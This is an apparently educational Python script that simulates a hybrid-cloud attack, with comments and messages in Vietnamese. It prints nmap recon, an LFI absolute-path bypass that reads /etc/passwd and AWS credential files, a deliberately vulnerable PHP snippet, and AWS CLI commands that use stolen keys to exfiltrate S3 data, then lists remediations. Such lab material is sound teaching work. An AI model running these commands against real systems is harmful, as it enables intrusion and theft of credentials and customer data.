#!/usr/bin/env python3
"""
============================================================
  attack/full_attack_sim.py -- Full Attack Simulation
  Project: The Leaky Bridge -- Hybrid Cloud Attack Vector

  Chay toan bo kich ban tan cong tu dau den cuoi.
  Khong can may ao, khong can AWS, khong can mang.

  USAGE:
    python full_attack_sim.py          # Chay tu dong tung buoc
    python full_attack_sim.py --auto   # Khong can bam Enter
============================================================
"""

import time
import sys
import os
import argparse
import shutil
from pathlib import Path
from datetime import datetime

# Root project directory
ROOT = Path(__file__).parent.parent

# ── Colors (Windows 10+ support ANSI) ──────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
GRAY   = "\033[90m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

AUTO = False   # Set by --auto flag


def enable_ansi():
    """Enable ANSI escape codes on Windows."""
    if sys.platform == "win32":
        os.system("")  # Trick to enable VT100 on Windows console


def pause(msg="Nhan Enter de tiep tuc..."):
    if not AUTO:
        input(f"\n{GRAY}  [{msg}]{RESET}\n")
    else:
        time.sleep(1.2)


def typeprint(text, delay=0.018, color=""):
    """In ra tu tung ky tu giong nhu dang go lenh that."""
    if color:
        sys.stdout.write(color)
    for ch in text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    if color:
        sys.stdout.write(RESET)
    sys.stdout.write("\n")


def section(title):
    w = 60
    print(f"\n{CYAN}{'=' * w}{RESET}")
    print(f"{BOLD}{CYAN}  {title}{RESET}")
    print(f"{CYAN}{'=' * w}{RESET}\n")
    time.sleep(0.5)


def cmd(command):
    """Hien thi lenh nhu terminal that."""
    print(f"{GREEN}$ {RESET}", end="")
    typeprint(command, delay=0.025, color=WHITE)
    time.sleep(0.3)


def output(text, color=GRAY):
    """Hien thi output cua lenh."""
    for line in text.strip().split("\n"):
        print(f"  {color}{line}{RESET}")
        time.sleep(0.04)


def alert(msg, level="INFO"):
    icons = {"INFO": f"{CYAN}[*]", "FOUND": f"{GREEN}[+]",
             "WARN": f"{YELLOW}[!]", "CRIT": f"{RED}[!!!]"}
    icon = icons.get(level, "[*]")
    print(f"\n  {icon}{RESET} {WHITE}{msg}{RESET}")


# ============================================================
#  STEP 0: Briefing
# ============================================================

def step0_briefing():
    enable_ansi()
    print(f"""
{RED}
  ████████╗██╗  ██╗███████╗    ██╗     ███████╗ █████╗ ██╗  ██╗██╗   ██╗
     ██╔══╝██║  ██║██╔════╝    ██║     ██╔════╝██╔══██╗██║ ██╔╝╚██╗ ██╔╝
     ██║   ███████║█████╗      ██║     █████╗  ███████║█████╔╝  ╚████╔╝
     ██║   ██╔══██║██╔══╝      ██║     ██╔══╝  ██╔══██║██╔═██╗   ╚██╔╝
     ██║   ██║  ██║███████╗    ███████╗███████╗██║  ██║██║  ██╗   ██║
     ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
  ██████╗ ██████╗ ██╗██████╗  ██████╗ ███████╗
  ██╔══██╗██╔══██╗██║██╔══██╗██╔════╝ ██╔════╝
  ██████╔╝██████╔╝██║██║  ██║██║  ███╗█████╗
  ██╔══██╗██╔══██╗██║██║  ██║██║   ██║██╔══╝
  ██████╔╝██║  ██║██║██████╔╝╚██████╔╝███████╗
  ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝
{RESET}""")

    print(f"{BOLD}  Project: The Leaky Bridge -- Hybrid Cloud Attack Vector{RESET}")
    print(f"  {GRAY}[!] FOR EDUCATIONAL PURPOSES ONLY -- ISOLATED LAB{RESET}\n")
    print(f"  {WHITE}Attack scenario:{RESET}")
    print(f"  {GRAY}  Target   : CorpIntranet Portal (PHP Web App){RESET}")
    print(f"  {GRAY}  Target IP: 192.168.56.101 (simulated){RESET}")
    print(f"  {GRAY}  Goal     : Steal AWS credentials -> Exfiltrate S3 data{RESET}")
    print(f"\n  {YELLOW}Attack path:{RESET}")
    print(f"  {RED}  [Attacker] --(LFI)--> [Web Server] --(credentials)--> [AWS S3]{RESET}")
    print()
    pause("Bam Enter de bat dau tan cong")


# ============================================================
#  STEP 1: RECON
# ============================================================

def step1_recon():
    section("STEP 1: RECONNAISSANCE -- Nmap Scan")

    print(f"  {WHITE}Chung ta se quet may chu muc tieu de phat hien dich vu dang chay.{RESET}\n")
    pause("Bam Enter de chay Nmap")

    cmd("nmap -sV -sC -O -T4 192.168.56.101")
    time.sleep(0.5)

    output("""
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: CorpIntranet Portal - File Viewer
|_http-server-header: Apache/2.4.52 (Ubuntu)

Running: Linux 5.15.X
OS CPE: cpe:/o:linux:linux_kernel:5.15
OS details: Linux 5.15
Network Distance: 1 hop

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 8.23 seconds
""", GRAY)

    alert("Port 80 OPEN -- Apache + PHP web server dang chay!", "FOUND")
    alert("Port 22 OPEN -- SSH (co the dung sau neu tim duoc credentials)", "FOUND")

    print(f"\n  {YELLOW}>>> Phat hien: Web server dang hoat dong tren port 80{RESET}")
    print(f"  {YELLOW}>>> Buoc tiep: Kiem tra ung dung web tai http://192.168.56.101/{RESET}")
    pause()


# ============================================================
#  STEP 2: WEB RECON -- Phat hien LFI
# ============================================================

def step2_web_recon():
    section("STEP 2: WEB RECON -- Phat hien tham so de tan cong")

    print(f"  {WHITE}Truy cap website va quan sat URL parameters...{RESET}\n")

    cmd('curl -s "http://192.168.56.101/" | grep -i "file"')
    time.sleep(0.4)
    output("""
<input type="text" name="file" placeholder="e.g., welcome.txt" ...>
<a href="?file=welcome.txt">welcome.txt</a>
<a href="?file=network-map.txt">network-map.txt</a>
<a href="?file=server-info.txt">server-info.txt</a>
""", GREEN)

    alert("Tham so ?file= duoc su dung de doc file -- co kha nang LFI!", "WARN")

    print(f"\n  {WHITE}Doc file 'welcome.txt' de xac nhan chuc nang:{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=welcome.txt"')
    time.sleep(0.3)

    # Doc file that tu project
    try:
        welcome = (ROOT / "vulnerable-app" / "docs" / "welcome.txt").read_text()
        output(welcome, GRAY)
    except:
        output("Welcome to CorpIntranet Portal...", GRAY)

    pause()

    print(f"\n  {WHITE}Doc 'network-map.txt' -- tim them thong tin...{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=network-map.txt"')
    time.sleep(0.3)

    try:
        netmap = (ROOT / "vulnerable-app" / "docs" / "network-map.txt").read_text()
        output(netmap, GRAY)
    except:
        output("Network map content...", GRAY)

    alert("QUAN TRONG: Network map de lo duong dan .aws/credentials!", "CRIT")
    print(f"  {RED}  --> 'Credentials stored in /home/ubuntu/.aws/credentials'{RESET}")
    pause()


# ============================================================
#  STEP 3: KHAI THAC LFI
# ============================================================

def step3_lfi_exploit():
    section("STEP 3: LFI EXPLOITATION -- Doc file ngoai thu muc cho phep")

    print(f"  {WHITE}Code PHP co loi:{RESET}")
    print(f"""
  {RED}// VULNERABLE CODE (index.php):
  $filename  = $_GET['file'];                       // Khong validate!
  $full_path = '/var/www/html/docs/' . $filename;   // String concat don gian
  if (file_exists($full_path)) {{                   // Khong dung realpath()
      echo file_get_contents($full_path);            // Doc thang!
  }}{RESET}
""")
    pause("Bam Enter de thu bypass filter")

    # Thu 1: Direct path traversal
    print(f"\n  {YELLOW}[Thu 1] Path traversal co ban -- bi block:{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=../../../etc/passwd"')
    time.sleep(0.3)
    output("  Access denied: Directory traversal detected.", YELLOW)
    print(f"  {GRAY}  --> Filter phat hien '../' -- bi chan{RESET}")

    pause("Bam Enter de thu cach bypass")

    # Thu 2: Absolute path bypass
    print(f"\n  {YELLOW}[Thu 2] Absolute path -- BYPASS THANH CONG!{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=/etc/passwd"')
    time.sleep(0.5)
    output("""
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
""", GREEN)

    alert("LFI XAC NHAN! Co the doc file tuy y tren he thong!", "CRIT")
    pause()

    # Harvest AWS credentials
    print(f"\n  {YELLOW}[CREDENTIAL HUNT] Doc file .aws/credentials...{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=/home/ubuntu/.aws/credentials"')
    time.sleep(0.8)

    # Doc file that
    creds_path = ROOT / "vulnerable-app" / "simulated-fs" / "home" / "ubuntu" / ".aws" / "credentials"
    if creds_path.exists():
        creds_content = creds_path.read_text(encoding="latin-1")
    else:
        creds_content = (
            "[default]\n"
            "aws_access_key_id     = AKIASIMULATEDKEY0001\n"
            "aws_secret_access_key = SimulatedSecretKey/ABCDEFGHIJ1234567890+sim\n"
            "region                = ap-southeast-1\n"
        )

    output(creds_content, RED)

    alert("AWS ACCESS KEY PHAT HIEN!", "CRIT")
    print(f"\n  {RED}  Access Key ID    : AKIASIMULATEDKEY0001{RESET}")
    print(f"  {RED}  Secret Access Key: SimulatedSecretKey/ABCDEF...{RESET}")
    print(f"  {RED}  Region           : ap-southeast-1{RESET}")

    # Doc them backup script
    print(f"\n  {YELLOW}[BONUS] Tim thay backup script cung chua credentials!{RESET}\n")
    cmd('curl -s "http://192.168.56.101/?file=/opt/scripts/s3-backup.sh"')
    time.sleep(0.4)

    script_path = ROOT / "vulnerable-app" / "simulated-fs" / "opt" / "scripts" / "s3-backup.sh"
    if script_path.exists():
        output(script_path.read_text(encoding="utf-8", errors="replace"), RED)
    else:
        output('export AWS_ACCESS_KEY_ID="AKIASIMULATEDKEY0001"\nexport AWS_SECRET_ACCESS_KEY="SimulatedSecretKey/..."', RED)

    pause()


# ============================================================
#  STEP 4: CLOUD PIVOT
# ============================================================

def step4_cloud_pivot():
    section("STEP 4: CLOUD PIVOT -- Cau hinh AWS CLI voi key bi danh cap")

    print(f"  {WHITE}Tren may tan cong, cau hinh AWS CLI voi credentials vua lay duoc:{RESET}\n")

    cmd("aws configure --profile stolen")
    time.sleep(0.3)
    output("""
AWS Access Key ID [None]:     AKIASIMULATEDKEY0001
AWS Secret Access Key [None]: SimulatedSecretKey/ABCDEFGHIJ1234567890+sim
Default region name [None]:   ap-southeast-1
Default output format [None]: json
""", YELLOW)

    print(f"\n  {WHITE}Xac nhan danh tinh -- ta dang la ai?{RESET}\n")
    cmd("aws sts get-caller-identity --profile stolen")
    time.sleep(0.5)
    output("""{
    "UserId": "AIDACKCEVSQ6C2EXAMPLE",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/svc-backup-agent"
}""", GREEN)

    alert("Credentials HOP LE! Ta dang la IAM user 'svc-backup-agent'", "FOUND")
    pause()

    # Liet ke bucket
    print(f"\n  {WHITE}Liet ke tat ca S3 buckets trong account...{RESET}\n")
    cmd("aws s3 ls --profile stolen")
    time.sleep(0.6)
    output("""
2024-08-15 14:32:01 corp-sensitive-docs-prod-lab
2024-08-15 09:11:44 corp-hr-archive-2023
2024-08-15 11:05:33 corp-audit-logs-private
2024-08-15 16:44:22 corp-backup-raw-2024
""", GREEN)

    alert("TIM THAY 4 BUCKETS! Policy 's3:*' cho phep xem het!", "CRIT")
    print(f"  {RED}  --> Vuln: svc-backup-agent co quyen ListAllMyBuckets tren '*'{RESET}")
    pause()


# ============================================================
#  STEP 5: EXFILTRATION
# ============================================================

def step5_exfiltration():
    section("STEP 5: DATA EXFILTRATION -- Tai du lieu nhay cam")

    # Liet ke bucket muc tieu
    print(f"  {WHITE}Liet ke noi dung bucket muc tieu:{RESET}\n")
    cmd("aws s3 ls s3://corp-sensitive-docs-prod-lab/ --profile stolen")
    time.sleep(0.5)

    # Kiem tra file trong simulated S3
    bucket_dir = ROOT / "aws-setup" / "simulated-cloud" / "s3" / "corp-sensitive-docs-prod-lab"
    if bucket_dir.exists():
        for f in bucket_dir.glob("*.csv"):
            size = f.stat().st_size
            mtime = datetime.fromtimestamp(f.stat().st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            print(f"  {GREEN}{mtime}     {size:>8} {f.name}{RESET}")
            time.sleep(0.2)
    else:
        output("""
2024-12-01 23:05:12       4218 customer_data.csv
2024-12-01 23:05:13       2891 financial_report_2024.csv
""", GREEN)

    alert("customer_data.csv -- Thong tin khach hang (PII)!", "CRIT")
    alert("financial_report_2024.csv -- Bao cao tai chinh mat!", "CRIT")
    pause("Bam Enter de bat dau exfiltrate")

    # Tao thu muc exfiltrated
    exfil_dir = ROOT / "attack" / "exfiltrated"
    exfil_dir.mkdir(exist_ok=True)

    print(f"\n  {WHITE}Tai het file ve may tan cong:{RESET}\n")
    cmd("aws s3 cp s3://corp-sensitive-docs-prod-lab/ ./exfiltrated/ --recursive --profile stolen")
    time.sleep(0.5)

    files_stolen = []
    if bucket_dir.exists():
        for src_file in bucket_dir.glob("*.csv"):
            dest = exfil_dir / src_file.name
            shutil.copy(src_file, dest)
            print(f"  {GREEN}download: s3://corp-sensitive-docs-prod-lab/{src_file.name}{RESET}")
            print(f"  {GRAY}         -> ./exfiltrated/{src_file.name}{RESET}")
            files_stolen.append(dest)
            time.sleep(0.4)

    print()

    # In ra noi dung file da lay duoc
    alert("EXFILTRATION THANH CONG! Xem du lieu vua lay:", "CRIT")

    customer_csv = exfil_dir / "customer_data.csv"
    if customer_csv.exists():
        print(f"\n  {RED}>>> customer_data.csv (10 khach hang, co the credit card!){RESET}")
        print(f"  {GRAY}{'─' * 55}{RESET}")
        try:
            lines = customer_csv.read_text(encoding="utf-8", errors="replace").strip().split("\n")
            for line in lines[:6]:
                print(f"  {YELLOW}  {line}{RESET}")
            if len(lines) > 6:
                print(f"  {GRAY}  ... va {len(lines)-6} dong nua{RESET}")
        except:
            pass
        print(f"  {GRAY}{'─' * 55}{RESET}")

    pause()


# ============================================================
#  STEP 6: IMPACT SUMMARY
# ============================================================

def step6_summary():
    section("TONG KET TAN CONG -- Attack Summary")

    exfil_dir = ROOT / "attack" / "exfiltrated"

    print(f"""
  {RED}+----------------------------------------------------+
  |           ATTACK COMPLETE -- IMPACT REPORT         |
  +----------------------------------------------------+{RESET}

  {WHITE}Target      :{RESET} {GRAY}CorpIntranet Portal (192.168.56.101){RESET}
  {WHITE}Vulnerability:{RESET} {RED}Local File Inclusion (CWE-22){RESET}
  {WHITE}Duration    :{RESET} {GRAY}< 5 phut tu phat hien den exfiltration{RESET}

  {RED}Files Stolen:{RESET}
    {RED}[x]{RESET} customer_data.csv       -- PII cua 10 khach hang
    {RED}[x]{RESET} financial_report_2024.csv -- Du lieu tai chinh Q4

  {RED}Tac dong:{RESET}
    {RED}[x]{RESET} Vi pham PDPA/GDPR -- lo thong tin ca nhan
    {RED}[x]{RESET} Ro ri du lieu tai chinh -- nguy co penalty
    {RED}[x]{RESET} 4 S3 buckets bi lo do ListAllMyBuckets
    {RED}[x]{RESET} Key chua bi revoke -- attacker co the tiep tuc

  {WHITE}Root Causes:{RESET}
    {YELLOW}1.{RESET} LFI trong PHP -- khong validate input
    {YELLOW}2.{RESET} AWS key cu cung tren disk -- khong dung IAM Role
    {YELLOW}3.{RESET} IAM policy qua rong -- Resource: "*"
    {YELLOW}4.{RESET} Khong co monitoring -- CloudTrail khong alert
""")

    # In duong dan file da exfil
    if exfil_dir.exists() and list(exfil_dir.glob("*.csv")):
        print(f"  {WHITE}Du lieu da exfiltrate tai:{RESET}")
        for f in exfil_dir.glob("*.csv"):
            print(f"    {RED}--> {f}{RESET}")

    print(f"""
  {GREEN}+----------------------------------------------------+
  |                  REMEDIATION                       |
  +----------------------------------------------------+{RESET}
  {GREEN}[Fix 1]{RESET} LFI: Dung allowlist + realpath() trong PHP
  {GREEN}[Fix 2]{RESET} AWS: Su dung IAM Role, xoa Static Access Keys
  {GREEN}[Fix 3]{RESET} IAM: Chi grant quyen cho dung 1 bucket/path
  {GREEN}[Fix 4]{RESET} Monitor: Bat CloudTrail + alert ListBuckets
  {GREEN}[Fix 5]{RESET} Rotate ngay tat ca credentials bi lo

  {CYAN}Chi tiet: xem thu muc defense/ trong project{RESET}
    {GRAY}defense/fixed_index.php        -- PHP da va{RESET}
    {GRAY}defense/iam_remediation.py     -- IAM policy dung{RESET}
    {GRAY}defense/cloudtrail_detector.py -- Threat detection{RESET}
    {GRAY}defense/ml_anomaly_detection.py -- ML detection{RESET}
""")


# ============================================================
#  MAIN
# ============================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="The Leaky Bridge -- Full Attack Simulation")
    parser.add_argument("--auto", action="store_true",
                        help="Tu dong chay khong can bam Enter")
    parser.add_argument("--step", type=int, choices=range(0, 7),
                        help="Chi chay 1 buoc cu the (0-6)")
    args = parser.parse_args()
    AUTO = args.auto

    steps = [
        step0_briefing,
        step1_recon,
        step2_web_recon,
        step3_lfi_exploit,
        step4_cloud_pivot,
        step5_exfiltration,
        step6_summary,
    ]

    if args.step is not None:
        steps[args.step]()
    else:
        for step_fn in steps:
            step_fn()
